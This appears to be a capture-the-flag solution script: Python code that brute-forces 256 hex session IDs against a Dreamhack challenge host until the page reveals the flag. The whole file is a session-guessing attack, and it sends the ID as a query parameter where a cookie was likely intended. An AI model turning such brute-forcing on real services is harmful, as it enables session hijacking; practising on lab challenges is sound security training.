import requests as muhyon
import os as eungdi

yagibunjota = "http://host3.dreamhack.games:23525/"

malsseungGgureogyNoalaGuireeulJabadangija = [_ for _ in range(256)]

for _ in malsseungGgureogyNoalaGuireeulJabadangija:
    unji523 = str(hex(_)[2:])
    print(unji523)
    park_won_soon = {'sessionid': unji523};
    owl_rock = muhyon.get(yagibunjota, park_won_soon);
    if owl_rock.text.find('flag is') > 0:
        print(owl_rock.text)
        print(unji523)
        break

# 함수
# 